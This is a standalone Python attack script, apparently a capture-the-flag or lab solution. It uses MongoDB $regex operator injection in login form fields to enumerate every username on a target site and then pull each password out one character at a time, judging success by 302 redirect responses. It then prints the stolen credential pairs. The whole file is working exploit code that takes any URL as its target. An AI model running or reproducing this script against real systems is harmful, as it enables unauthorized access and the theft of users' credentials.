#!/usr/bin/env python3.8
import string
import requests
import re
import sys

url = None


def get_user():
    usernames = []

    growing_username = ""
    for i in string.printable:
        if name_starts_with(i):
            print('Spotted user with: {}'.format(i))
            growing_username += i
            is_searching = True
            while is_searching:
                for j in string.printable:
                    current_username_to_test = growing_username + j
                    if name_starts_with(current_username_to_test):
                        growing_username += j
                        print('-----------------: {}'.format(growing_username))
                        break
                if valid_user(growing_username):
                    print('----Complete user: \033[1m\033[93m{}\033[0m\n'.format(growing_username))
                    is_searching = False
                    usernames.append(growing_username)
                    growing_username = ''

    print('Found: \033[1m\033[93m{}\033[0m'.format(usernames))
    return usernames


def valid_user(username):
    payload = {'username': username, 'password[$regex]': '.*', 'login': 'login'}
    r = requests.post(url, data=payload, verify=False, allow_redirects=False)
    return r.status_code == 302


def name_starts_with(name_part):
    payload = {'username[$regex]': '^' + re.escape(name_part) + '.*', 'password[$regex]': '.*', 'login': 'login'}
    r = requests.post(url, data=payload, verify=False, allow_redirects=False)
    return r.status_code == 302


def get_password(username):
    password = ''
    for i in string.printable:
        if password_starts_with(username, i):
            print('Password start found {}: {}'.format(username, i))
            password += i
            while True:
                for j in string.printable:
                    current = password + j
                    if password_starts_with(username, current):
                        password += j
                        print('Next character found {}: {}'.format(username, password))
                        break
                if valid_password(username, password):
                    print('Password extracted   {}: \033[1m\033[93m{}\033[0m\n'.format(username, password))

                    return password


def valid_password(username, password):
    payload = {'username': username, 'password': password, 'login': 'login'}
    r = requests.post(url, data=payload, verify=False, allow_redirects=False)
    return r.status_code == 302


def password_starts_with(username, password_part):
    payload = {'username': username, 'password[$regex]': '^' + re.escape(password_part) + '.*', 'login': 'login'}
    r = requests.post(url, data=payload, verify=False, allow_redirects=False)
    return r.status_code == 302


def main():
    credentials = {}
    for username in get_user():
        password = get_password(username)
        credentials[username] = password

    [print('{}:{}'.format(username, password)) for username, password in credentials.items()]


if __name__ == '__main__':
    url = sys.argv[1]
    if not url:
        print("QUITTING - url not set!")
        exit(1)

    main()
